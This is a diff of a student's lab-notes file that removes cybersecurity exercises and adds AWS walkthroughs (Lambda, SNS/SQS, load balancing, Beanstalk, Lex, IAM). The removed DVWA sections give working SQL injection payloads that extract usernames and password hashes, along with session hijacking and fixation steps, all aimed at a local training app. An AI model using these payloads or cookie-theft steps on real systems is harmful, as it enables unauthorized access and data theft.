@@ -1,488 +1,728 @@
-Manual Firewall Configuration (Inbound Rule): 
-This part explains how to manually block a specific IP using the Windows Firewall GUI. 
-Steps: 
-1. Open Windows Defender Firewall with Advanced Security. 
-2. Click on Inbound Rules. 
-3. Click New Rule,on the right panel. 
-4. Select Custom and click Next. 
-5. Choose All Programs → Click Next. 
-6. Protocol and Ports: Keep default → Click Next. 
-7. Scope: 
-o Under Remote IP address, select These IP addresses. 
-o Click Add and enter the IP you want to block (example: 1.2.3.4). 
-o Click OK → Next. 
-8. Action: Select Block the connection → Next. 
-9. Profile: Select Domain, Private, Public → Next. 
-10. Name the rule (example: Manual_Block_IP) → Finish. 
-This rule will now block all incoming traffic from that specific IP. 
-Automated Firewall Configuration (Using Python Script): 
-Instead of blocking one IP, the script downloads a list of malicious IPs and blocks all of them 
-automatically.
-
-
-
-
-
-Problem Statement: 
-Write a Python program that downloads a list of malicious IP addresses from a trusted online 
-source and automatically creates firewall rules to block those IPs from accessing the system. 
-Program: (File name: firewall.py) 
-import requests
-import csv
-import subprocess
-
-# Source: Abuse CH
-response = requests.get(
-    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
-).text
-
-# Delete existing firewall rule
-rule = 'netsh advfirewall firewall delete rule name="BadIP"'
-subprocess.run(["PowerShell", "-Command", rule])
-
-# Read CSV data (ignore commented lines)
-mycsv = csv.reader(
-    filter(lambda x: not x.startswith("#"), response.splitlines())
-)
+***WEEK 7:LAMBDA***
 
-# Add firewall rule for each malicious IP
-for row in mycsv:
-    ip = row[1]
+Step-by-Step Execution (Follow exactly)
+🔹 Step 1: Open Lambda
+Go to AWS Console
+Search: Lambda
+Click Lambda service
+🔹 Step 2: Create Function
+Click Create function
+Select: Author from scratch
 
-    if ip != "dst_ip":
-        print("Added Rule to block:", ip)
-
-        rule = (
-            "netsh advfirewall firewall add rule "
-            "name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
-        )
+Fill details:
 
-        subprocess.run(["PowerShell", "-Command", rule])
-Sample Output: 
-Added Rule to block: 45.9.148.221 
-Added Rule to block: 103.17.48.5 
-Added Rule to block: 185.234.219.12 
+Function name → basic-python-lambda
+Runtime → Python 3.9 (or latest)
+Architecture → x86_64
 
+👉 Permissions:
 
-Execution Steps: 
-1. Open Command Prompt and select Run as Administrator. 
-(Firewall rules require admin rights.) 
-2. Navigate to the folder where firewall.py is saved. 
-Example: cd C:\Users\YourName\Desktop 
-3. Make sure Python is installed: python --version 
-4. install required library (if not already installed):-  python -m pip install requests 
-5. Execute the program: python firewall.py 
-6. Output will appear in Command Prompt like: 
-Added Rule to block: 45.9.148.221 
-Added Rule to block: 103.17.48.5 
-For every IP, you will see: 
-o “Added Rule to block: <IP>” 
-o PowerShell/Command Prompt will also show OK message for successful rule 
-creation. 
-7. Cross-verify the rules: 
-o Open Windows Defender Firewall with Advanced Security 
-o Go to Outbound Rules 
-o Search for rule name: BadIP 
-o You will see many blocked IP addresses listed
+Select Use existing role
+Choose Lab Role
 
+Click Create function
 
+🔹 Step 3: Understand Default Code
 
+You’ll see this code:
 
+import json
+def lambda_handler(event, context):
+    return {
+        'statusCode': 200,
+        'body': json.dumps('Hello from Lambda!')
+    }
+Quick understanding (for viva):
+event → input data
+context → runtime info
+lambda_handler → main function
+statusCode → response status
+body → output
+🔹 Step 4: Replace Code (IMPORTANT)
 
-# File name: password_checker.py
+Delete default code and paste this:
 
-import re
+import json
 
-def check_password_strength(password):
-    if len(password) < 8:
-        return "Weak: Password must be at least 8 characters long."
-    
-    if not any(char.isdigit() for char in password):
-        return "Weak: Password must include at least one number."
-    
-    if not any(char.isupper() for char in password):
-        return "Weak: Password must include at least one uppercase letter."
-    
-    if not any(char.islower() for char in password):
-        return "Weak: Password must include at least one lowercase letter."
-    
-    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
-        return "Medium: Add special characters to make your password stronger."
-    
-    return "Strong: Your password is secure!"
+def lambda_handler(event, context):
+    a = event.get('num1', 0)
+    b = event.get('num2', 0)
+    result = a + b
 
+    return {
+        'statusCode': 200,
+        'body': json.dumps({
+            'sum': result
+        })
+    }
 
-def password_checker():
-    print("Welcome to the Password Strength Checker!")
+👉 This code:
 
-    while True:
-        password = input("\nEnter your password (or type 'exit' to quit): ")
+Takes num1 and num2
+Adds them
+Returns result
+🔹 Step 5: Deploy
 
-        if password.lower() == "exit":
-            print("Thank you for using the Password Strength Checker! Goodbye!")
-            break
+Click Deploy
+✔️ Wait for "Successfully deployed"
 
-        result = check_password_strength(password)
-        print(result)
+🔹 Step 6: Create Test Event
+Click Test
+Click Create new event
 
+Fill:
 
-if __name__ == "__main__":
-    password_checker()
+Event name → testInput
 
+Paste this JSON:
 
+{
+  "num1": 10,
+  "num2": 20
+}
 
+Click Test
 
+🔹 Step 7: Output (VERY IMPORTANT)
 
-**Experiment: Analyzing Phishing Emails** 
-To analyze a suspicious email using EML Analyzer and VirusTotal and identify whether it is 
-phishing based on technical indicators. 
-Tools Used: - Online EML Analyzer - VirusTotal - Sample file: 2020-05-05-phishing-email-example-01.eml
+You should see:
 
+{
+  "statusCode": 200,
+  "body": "{\"sum\": 30}"
+}
 
+✔️ This means SUCCESS
 
-Part A: EML Analyzer Results 
-The file 2020-05-05-phishing-email-example-01.eml was uploaded to the EML Analyzer. 
-EML Analyzer Results:
+📌 If you see this → experiment done ✔️
 
+🔹 Step 8: Configuration (if asked)
 
-Part B: VirusTotal Analysis 
-The sender IP 94.100.31.27 was checked on VirusTotal. 
-VirusTotal Result: 
-• Detection Ratio: 1 / 93 vendors flagged as malicious 
-• Location: Netherlands 
-• ASN: AS29802 (HVC-AS)
+Go to:
 
+General Configuration → Edit
 
+Set:
 
+Memory → 128 MB
+Timeout → 3 sec
+Architecture → x86_64
 
 
 
 
 
-**Packet Sniffing and Network Traffic Analysis**
+***WEEK:8 SNS,SQS***
 
 
-Procedure: 
-Step 1: Open Kali Linux. 
-Step 2: Open Terminal in Kali Linux. 
- 
-Step 3:  
-Start a local HTTP server on port 8080 using : 
-python3 -m http.server 8080 
+Steps (Browser only — AWS Console)
+1. Create SNS Topic
+Go to AWS → Search SNS
+Click Topics → Create topic
+Type: Standard
+Name: MyEmailTopic
+Create
+2. Create Email Subscription
+Open topic → Subscriptions → Create subscription
+Protocol → Email
+Enter your email
+Click Create
+3. Confirm Subscription ⚠️
+
+👉 VERY IMPORTANT
+
+Go to email inbox
+Click Confirm subscription
+4. Publish Message
+Open topic → Click Publish message
+Subject → Test Mail
+Message → Hello this is SNS test
+Click Publish
+
+✔️ You’ll receive email
+
+🎯 Viva Points
+SNS = Pub/Sub system
+Sends same message to multiple subscribers
+Protocols: Email, SMS, HTTP
+
+
+
+
+
+
+
+
+***PART 2: SQS – Queue Messaging***
+💡 Concept
+
+Using Amazon Web Services SQS:
+
+Messages stored in queue
+Processed later
+Helps avoid system overload
+🚀 Steps
+1. Create Queue
+Search SQS
+Click Create queue
+Type: Standard
+Name: MyQueue
+Create
+2. Send Message
+Open queue → Send and receive messages
+Message:
+Hello this is SQS test message
+Click Send
+3. Receive Message
+Click Poll for messages
+✔️ You’ll see message
+🎯 Viva Points
+SQS = Message queue
+Used for decoupling systems
+Stores messages reliably
+
+
+
+***🔶 PART 3: FULL ARCHITECTURE (MOST IMPORTANT 🔥)***
+🧠 Concept Flow
+S3 (Upload file)
+   ↓
+SNS (Send notification)
+   ↓
+SQS (Store message)
+   ↓
+Lambda (Process message)
+
+👉 This is called event-driven serverless architecture
 
-Step 4: In another new terminal start packet capture: 
-sudo tcpdump -i any -w capture.pcap port 8080
+🚀 Steps (Simplified for lab)
+✅ Step 1: Create S3 Bucket
+Go to S3
+Create bucket:
+Name: mys3eventbucket123 (unique)
+Region: SAME as SNS ⚠️
+Create
+✅ Step 2: Create SNS Topic
+Name: MyS3SNSTopic
+✅ Step 3: Create SQS Queue
+Name: MyS3Queue
+✅ Step 4: Connect SNS → SQS
+Open SNS Topic
+Create subscription:
+Protocol → SQS
+Select your queue
+✅ Step 5: Configure S3 → SNS
+Open S3 bucket → Properties
+Event notifications → Create
+Event: All object create
+Destination: SNS topic
+✅ Step 6: Test (IMPORTANT)
+Upload file to S3
+
+✔️ What happens:
+
+S3 sends event
+SNS sends message
+SQS stores message
+✅ Step 7: Check SQS
+Open queue
+Poll messages
+✔️ You’ll see event data
+✅ Step 8: Add Lambda (Final step)
+Create Lambda:
+Name: SQSConsumerFunction
+Runtime: Python
+Add trigger:
+Select SQS
+Choose your queue
+Replace code:
+def lambda_handler(event, context):
+    for record in event['Records']:
+        print("Message received from SQS:")
+        print(record['body'])
+
+    return {
+        'statusCode': 200,
+        'body': 'Message processed successfully'
+    }
+Click Deploy
+🎯 FINAL RESULT (Say in viva)
+
+👉 When file is uploaded:
+
+S3 triggers event
+SNS sends notification
+SQS stores message
+Lambda processes it
+
+
+
+
+***WEEK:9 LOAD BALANCER***
+
+🧩 PART 1: Create EC2 Servers
+💡 Concept
+
+Using Amazon Web Services EC2:
+
+These are your web servers
+🚀 Steps
+1. Launch Instance 1
+Go to EC2 → Launch Instance
+Name → webserver-1
+AMI → Amazon Linux 2
+Instance → t2.micro
+Security Group:
+SSH (22) → My IP
+HTTP (80) → Anywhere
+
+Launch → Download key → Launch
+
+Connect & Run Commands (IMPORTANT ⚠️)
+
+👉 Use EC2 browser terminal OR Git Bash (not Kali)
+
+yum update -y
+yum install httpd -y
+systemctl start httpd
+systemctl enable httpd
+echo "This is Server 1" > /var/www/html/index.html
+
+
+2. Launch Instance 2
+
+Repeat same steps
+Change last line:
+
+echo "This is Server 2" > /var/www/html/index.html
+✅ Test
+Copy public IP → open browser
+✔️ You should see Server 1 / Server 2 page
+🧩 PART 2: Create Load Balancer (ALB)
+💡 Concept
+
+👉 Elastic Load Balancing distributes traffic
+
+🚀 Steps
+1. Create Security Group
+Name → lb-sg
+Allow HTTP (80)
+2. Create Load Balancer
+EC2 → Load Balancers → Create
+Type → Application Load Balancer
+
+Fill:
+
+Name → my-alb
+Scheme → Internet-facing
+Listener → HTTP (80)
+3. Select VPC + Subnets
+Choose default VPC
+Select 2 subnets
+4. Attach Security Group
+Select lb-sg
+5. Create Target Group
+Name → web-servers-tg
+Type → Instance
+Protocol → HTTP
+
+👉 Register:
+
+webserver-1
+webserver-2
+6. Create Load Balancer
+✅ Test (VERY IMPORTANT)
+Copy DNS name of ALB
+Paste in browser
+
+👉 Refresh multiple times:
+
+You’ll see:
+Server 1
+Server 2
+
+✔️ That means Load Balancer works
+
+🧩 PART 3: Auto Scaling (MOST IMPORTANT 🔥)
+💡 Concept
+
+👉 Auto Scaling:
+
+Automatically adds/removes servers based on load
+🚀 Steps
+✅ Step 1: Create AMI
+EC2 → Instances
+Select instance
+Actions → Create Image
+
+Name → my-webserver-AMI
+
+✅ Step 2: Create Launch Template
+EC2 → Launch Templates
+Name → my-launch-template
+Select AMI
+Instance → t2.micro
+Security Group → HTTP allowed
+✅ Step 3: Create Auto Scaling Group
+Name → webserver-asg
+Select launch template
+Network:
+Choose VPC
+Select subnets
+Attach Load Balancer:
 
-Step 5: Open Firefox in kali Linux and go to: 
-http://localhost:8080 
-Refresh the page to generate traffic.
-
-Step 6: 
-Go back to tcpdump terminal. 
-Stop packet capturing by using Ctrl + C. 
-It will stop and show how many packets were captured 
-The packets are saved as capture.pcap. 
-Step 7: 
-• Click the Kali Linux dragon icon (top left). 
-•  Type: File Manager and open it. 
-•  Your Home folder will open. 
-• You will see the file: capture.pcap.
-
-Step 8:- 
-• Since Wireshark is pre-installed in Kali, just double-click capture.pcap. 
-• The file will open directly in Wireshark for analysis.
-Step 9:-  
-Filter Login Packets 
-In Wireshark filter bar, type: http.request.method == "POST" 
-Press Enter. 
-Now only important packets will show. 
-
-Step 10:- 
-Click on any one of the packet and the following data is displayed. 
-Browser details such as OS, browser version, language, and visited URLs are visible.If a form is 
-submitted, username and password can be seen in plain text.This proves HTTP is insecure.
-
-
-
-
-**SQL Injection Attack – Cyber Security Lab Experiment**
-Step 1: Install DVWA 
-sudo apt update 
-sudo apt install dvwa –y 
-Step 2: Start Required Services 
-sudo service apache2 start 
-sudo service mysql start 
-Step 3: Configure DVWA 
-Edit config file: 
-sudo nano /etc/dvwa/config.inc.php 
-Ensure: 
-$_DVWA['db_password'] = ''; 
-Save and exit. 
-
-Step 4: Open DVWA in Browser(Firefox) 
-http://127.0.0.1/dvwa 
- Login: 
-o Username: admin 
-o Password: password 
- Click Create / Reset Database 
-Step 5: Set Security Level 
- Go to DVWA Security 
- Set Security Level = Low 
- Click Submit 
-
-4. SQL Injection Attack on DVWA 
-Step 6: Navigate to SQL Injection Module 
-DVWA → Vulnerabilities → SQL Injection 
-You will see an input box asking for User ID.
-5. Basic SQL Injection Test 
-Step 7: Normal Input : 1 
- Displays user details normally
-
-Step 8: Authentication Bypass 
-Enter: 
-1' OR '1'='1 
- Result:All user records are displayed 
-Confirms SQL Injection vulnerability 
-6. SQL Injection – Database Enumeration 
-Step 9: Find Number of Columns 
-1' ORDER BY 1-- - 
-1' ORDER BY 2-- - 
-1' ORDER BY 3-- - 
-Stop when error occurs    Last successful number = total columns
-
-Step 10: UNION-Based Injection 
-1' UNION SELECT 1,2-- - 
-
-Step 11: Extract Database Name 
-1' UNION SELECT database(),2-- - 
-Step 12: Extract Table Names 
-1' UNION SELECT table_name,2  
-FROM information_schema.tables  
-WHERE table_schema=database()-- - 
-
-Step 13: Extract Column Names 
-1' UNION SELECT column_name,2  
-FROM information_schema.columns  
-WHERE table_name='users'-- - 
-
-Step 14: Extract Username & Password 
-1' UNION SELECT user,password FROM users-- - 
- Passwords may appear as hashes.
-
-8. Result 
-The SQL Injection attack was successfully performed, demonstrating: 
- Authentication bypass 
- Unauthorized data access 
- Poor input validation vulnerability 
-9. Conclusion 
-This experiment proves that: 
- Unsanitized user input leads to SQL Injection 
- Attackers can extract sensitive database information 
- Proper security controls are mandatory
-
-
-**LAB EXPERIMENT : Testing Authentication Weaknesses and Session Management**
-
-PROCEDURE 
-PART A: Launch DVWA 
-Step 1: Start Required Services 
-Open terminal and start Apache and MySQL: 
-sudo service apache2 start 
-sudo service mysql start
-
-Step 2: Open DVWA in Browser 
-Open Firefox and enter: 
-http://127.0.0.1/dvwa
-
-Step 3: Login to DVWA 
-Use default credentials: 
-Username: admin   
-Password: password 
-
-Step 4: Set Security Level 
- Go to DVWA Security 
- Select LOW 
- Click Submit
-
-PART B: Testing Authentication Weaknesses 
-Experiment 1: Weak Password Authentication 
-Step 1: Open Brute Force Module 
-Navigate to: 
-DVWA → Vulnerabilities → Brute Force 
-
-
-Step 2: Try Common Passwords 
-Enter: 
-Username: admin 
-Password: password 
-Observation 
-Successful login indicates weak authentication. 
-Experiment 2: Manual Brute Force Attack 
-Enter Username (Same Every Time) 
-In Username field, type: 
-admin 
-Do NOT change username. 
-Step 3: Try Passwords ONE BY ONE 
-Now you will manually try passwords (this is the “manual brute force”). 
-Attempt 1 
- Username: admin 
- Password: admin 
- Click Login 
-❌ If it fails → try next password 
- 
- 
- Attempt 2 
- Username: admin 
- Password: 123456 
- Click Login 
-❌ If it fails → try next password 
- 
- 
-Attempt 3 
- Username: admin 
- Password: password 
- Click Login 
-LOGIN SUCCESSFUL 
-Step 4: Observe What Happened 
- DVWA did NOT block you 
- DVWA did NOT lock account 
- DVWA allowed unlimited attempts 
-This is called Brute Force Vulnerability 
-PART C: Testing Session Management Vulnerabilities 
-✅ Experiment 3: Session ID Analysis 
-Step 1: Login to DVWA 
-Open browser developer tools: 
-Right Click → Inspect → Storage → Cookies 
-Step 2: Observe Session Cookie 
-Look for: 
-PHPSESSID 
-Observation 
-Session ID is visible and not encrypted. 
-PHPSESSID : 5f6194766020dcaa2c906358cbd2941b 
-Experiment 4: Session Hijacking 
-BEFORE YOU START (IMPORTANT) 
-DVWA security level = LOW 
-You are logged in as admin in DVWA 
-STEP-BY-STEP  
-Step 1: Open DVWA (Victim Session) 
-1. Open Firefox 
-2. Go to: http://127.0.0.1/dvwa 
-3. Login: 
-Username: admin 
-Password: password 
-4. Stay logged in (do NOT logout) 
-This browser is the Victim 
-Step 2: Copy the Session ID (PHPSESSID) 
-1. In the same Firefox window 
-2. Right click → Inspect 
-3. Click Storage tab 
-4. Click Cookies 
-5. Select: http://127.0.0.1 
-You will see something like: 
-PHPSESSID   a8c9f7e3d4b1... 
-6. Right-click on PHPSESSID value → Copy 
-This value is the session ID (user identity). 
-Step 3: Open Attacker Browser (Private Window) 
-1. Press: 
-Ctrl + Shift + P 
-(Private Window opens) 
-Do NOT login here. 
-Step 4: Paste Session ID in Attacker Browser 
-1. In Private Window, go to: http://127.0.0.1/dvwa 
-2. Right click → Inspect 
-3. Go to Storage → Cookies 
-4. Click: http://127.0.0.1 
-5. Find PHPSESSID 
-6. Replace its value with the copied PHPSESSID (5f6194766020dcaa2c906358cbd2941b) 
-7. Press Enter 
-Step 5: Refresh Page 
-1. Refresh the page (F5) 
-You are logged in as admin without username or password! 
-Result 
-Attacker gains access without login → Session Hijacking. 
-Experiment 5: Session Fixation 
-IMPORTANT CONDITIONS (CHECK FIRST) 
-DVWA Security Level = LOW 
-Use only ONE browser window (normal window) 
-Do NOT use Private Window here 
-STEP-BY-STEP (DO EXACTLY THIS) 
-Step 1: Open DVWA WITHOUT Login (Attacker sets session) 
-1. Open Firefox 
-2. Go to: http://127.0.0.1/dvwa/ 
-You will see the login page 
-Do NOT login 
-Step 2: Note the Session ID (Before Login) 
-1. Right click → Inspect 
-2. Go to Storage 
-3. Click Cookies 
-4. Select: http://127.0.0.1 
-You will see: 
-PHPSESSID = 5f6194766020dcaa2c906358cbd2941b
-Step 3: Login WITHOUT Closing Browser 
-Now, in the same browser window: 
-1. Enter: 
-Username: admin 
-Password: password 
-2. Click Login 
-Do NOT refresh, do NOT close browser 
-Step 4: Check Session ID AGAIN (After Login) 
-1. Again open: 
-Inspect → Storage → Cookies → http://127.0.0.1 
-2. Look at PHPSESSID 
-3.  
-OBSERVE CAREFULLY 
-Case 1 (VULNERABLE – DVWA LOW) 
-Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
-After Login  PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
-Same value  
-Session Fixation exists 
-Case 2 (SECURE – DVWA HIGH / IMPOSSIBLE) 
-Before Login PHPSESSID = 5f6194766020dcaa2c906358cbd2941b 
-After Login  PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
-Session regenerated  
-No session fixation 
-Experiment 6:  
-CONDITIONS (CHECK FIRST) 
-DVWA Security Level = LOW 
-You must know how to view cookies  
-STEP-BY-STEP ( 
-Step 1: Login Normally (Victim Session) 
-1. Open Firefox 
-2. Go to: http://127.0.0.1/dvwa/ 
-3. Login: 
-Username: admin 
-Password: password 
-Step 2: Copy Session ID (IMPORTANT) 
-1. Right click → Inspect 
-2. Storage → Cookies → http://127.0.0.1 
-3. Copy: 
-PHPSESSID = be2d584526b42fef6742d5cf95ce008f 
-Screenshot 1: PHPSESSID before logout 
-Step 3: Logout from DVWA 
-1. Click Logout (top right or menu) 
-2. You will see login page 
-Logout completed 
-Step 4: Reuse OLD Session ID (THIS IS THE TEST) 
-Option A (EASIEST & EXAM-SAFE) 
-1. Open Private Window 
-Ctrl + Shift + P 
-2. Go to: 
-http://127.0.0.1/dvwa/ 
-3. Open Inspect → Storage → Cookies 
-4. Paste the OLD PHPSESSID (copied earlier) 
-5. Press Enter 
-Step 5: Open Internal Page (KEY STEP 🔑) 
-In address bar, type: 
-http://127.0.0.1/dvwa/index.php 
-(or) 
-http://127.0.0.1/dvwa/vulnerabilities/brute/ 
-�
-� Do NOT press Login 
-�
-� Do NOT enter username/password 
-�
-� EXPECTED RESULT (DVWA LOW) 
-✔ You are logged in again 
-✔ Without login 
-✔ Using old session ID 
-Logout did NOT destroy session
+👉 VERY IMPORTANT
+
+Select existing Load Balancer
+Capacity:
+Desired → 2
+Min → 1
+Max → 4
+
+Create ASG
+
+✅ Test Auto Scaling
+Test 1: Normal
+Go to ALB → DNS
+Refresh → multiple servers
+Test 2: Auto Recovery 🔥
+Terminate one EC2 instance
+
+👉 After few seconds:
+✔️ New instance will be created automatically
+
+🎯 FINAL FLOW (Say in viva confidently)
+User → Load Balancer → EC2 Instances
+                        ↑
+                  Auto Scaling adds/removes servers
+
+
+
+
+
+***WEEK:10 ELASTIC BEAN STACK***
+
+
+STEP-BY-STEP EXECUTION
+🔹 Step 1: Open Beanstalk
+Go to AWS Console
+Search: Elastic Beanstalk
+Click Create Application
+🔹 Step 2: Create Application
+Name → MyApp
+Click Create
+🔹 Step 3: Create Environment
+Click Create Environment
+Choose:
+Web Server Environment
+🔹 Step 4: Configure
+Basic:
+Environment name → my-env
+Platform:
+
+Choose based on your app:
+
+Python / Node.js / Tomcat / PHP
+
+👉 If you don’t know:
+✔️ Select Python (safe option)
+
+Upload Code:
+Select Upload your code
+Upload .zip file
+
+👉 If no code:
+
+Use Sample application (quick hack for lab)
+🔹 Step 5: Service Access
+Role → LabRole
+Instance profile → LabInstanceProfile
+🔹 Step 6: Network
+VPC → default
+Subnets → default
+Enable public IP
+🔹 Step 7: Scaling
+Instance → t2.micro
+Min → 1
+Max → 2
+Load Balancer → enabled
+🔹 Step 8: Create
+Click Review → Create
+
+⏳ Wait 2–5 minutes
+
+✅ OUTPUT (VERY IMPORTANT)
+
+After deployment:
+
+You’ll get a URL
+
+👉 Open it → Your app runs 🎉
+
+✔️ That means SUCCESS
+
+
+
+
+
+***WEEk 11:AMAZON LEX***
+
+STEP-BY-STEP EXECUTION
+🔹 Step 1: Open Lex
+Go to AWS
+Search Amazon Lex
+Click Create bot
+🔹 Step 2: Create Bot
+Select → Create blank bot
+Name → HotelBookingBot
+IAM role → Create new
+Language → English
+Click Done
+🔹 Step 3: Create Intent
+
+👉 Intent = user goal
+
+Go to Intents
+Create → BookHotel
+🔹 Step 4: Add Utterances
+
+👉 These are user sentences
+
+Add:
+
+I want to book a hotel
+Book a room
+Reserve hotel
+I need a room
+🔹 Step 5: Add Slots (VERY IMPORTANT)
+
+👉 Slots = user inputs
+
+Slot 1: Age
+Name → age
+Type → AMAZON.Number
+Prompt → “What is your age?”
+Required → Yes
+🔥 Add Condition (Important for viva)
+
+If age < 18:
+👉 “You are not eligible”
+
+Slot 2: Location
+Type → AMAZON.City
+Prompt → “Which city?”
+Slot 3: Check-in
+Type → AMAZON.Date
+Prompt → “Check-in date?”
+Slot 4: Nights
+Type → AMAZON.Number
+Prompt → “How many nights?”
+🔹 Step 6: Custom Slot (Room Type)
+
+👉 Create Slot Type:
+
+Name → RoomType
+Values:
+Single
+Double
+Suite
+
+Then add slot:
+
+Slot name → roomtype
+Slot type → RoomType
+🔹 Step 7: Add Buttons (Optional but good)
+
+👉 Response cards:
+
+Single
+Double
+Suite
+🔹 Step 8: Responses
+
+Initial:
+👉 “Welcome to Hotel Booking!”
+
+Confirmation:
+👉 “Confirm booking in {location} for {nights} nights?”
+
+🔹 Step 9: Build & Test 🔥
+Click Build
+Open test panel
+
+Try:
+
+Book a hotel
+✅ EXPECTED OUTPUT
+
+Conversation like:
+
+Bot: What is your age?
+User: 25
+Bot: Which city?
+User: Hyderabad
+Bot: Check-in date?
+User: Tomorrow
+Bot: Nights?
+User: 2
+Bot: Room type?
+User: Double
+Bot: Confirm booking?
+
+✔️ That means SUCCESS
+
+
+
+
+
+
+
+***WEEK 12: IAM USER(GUI AND CLI)***
+
+
+PART A: GUI ACCESS (Web Login)
+💡 Concept
+
+👉 Create user → Give limited permission → Test access
+
+🚀 Steps
+🔹 Step 1: Login as Root
+Open AWS Console
+Login using root account
+🔹 Step 2: Open IAM
+Search IAM
+Go to Users → Create user
+🔹 Step 3: Create User
+Name → S3_Specialist
+Enable:
+✔️ Management Console access
+Set password
+🔹 Step 4: Set Permissions
+Select:
+👉 Attach policies directly
+Choose:
+👉 AmazonS3FullAccess
+🔹 Step 5: Create & Download CSV ⚠️
+Click Create
+Download .csv (VERY IMPORTANT)
+
+👉 Contains:
+
+Username
+Password
+Login URL
+🔹 Step 6: Logout Root
+🔹 Step 7: Login as IAM User
+Use Sign-in URL
+Enter:
+Account ID
+Username
+Password
+✅ TEST (VERY IMPORTANT)
+❌ Test 1 (EC2)
+Open EC2
+👉 You’ll see Access Denied
+✅ Test 2 (S3)
+Open S3
+Create bucket
+
+✔️ Works
+
+🎯 What this proves
+
+👉 User has:
+
+S3 access ✅
+EC2 access ❌
+🔥 PART B: CLI ACCESS
+💡 Concept
+
+👉 Access AWS using terminal commands
+
+🚀 Steps
+🔹 Step 1: Generate Keys
+IAM → Users → Select user
+Security credentials
+Create access key
+Select CLI
+
+👉 Download CSV
+
+🔹 Step 2: Install CLI
+
+👉 Install AWS CLI from Google
+
+🔹 Step 3: Configure CLI
+
+Open CMD / Terminal:
+
+aws configure
+
+Enter:
+
+Access Key
+Secret Key
+Region → ap-south-1
+Output → json
+🔹 Step 4: Test Commands
+✅ Command 1
+aws s3 ls
+
+✔️ Shows buckets
+
+✅ Command 2
+aws s3 mb s3://your-unique-name
+
+✔️ Creates bucket
+
+❌ Command 3
+aws iam list-users
+
+👉 ❌ Access Denied
+
+
+
+
+
+
+
+
+
+
+
+***WEEK 13: IAM ROLES***
+STEP-BY-STEP EXECUTION
+🔹 Step 1: Create IAM Role
+Go to IAM → Roles → Create role
+
+Select:
+
+Trusted entity → AWS Service
+Use case → EC2
+🔹 Step 2: Add Permissions
+Search → AmazonS3FullAccess
+Select it
+🔹 Step 3: Name Role
+Name → EC2-S3-Role
+Create role
+🔹 Step 4: Attach Role to EC2
+Go to EC2
+Select running instance
+
+👉 Actions → Security → Modify IAM role
+
+Select → EC2-S3-Role
+Click Update
+🔹 Step 5: Test in EC2 (IMPORTANT)
+
+👉 Connect to EC2 (browser terminal or SSH)
+
+✅ Test 1 (S3 works)
+aws s3 ls
+
+✔️ Shows buckets
+
+❌ Test 2 (EC2 fails)
+aws ec2 describe-instances
+
+👉 ❌ Access Denied
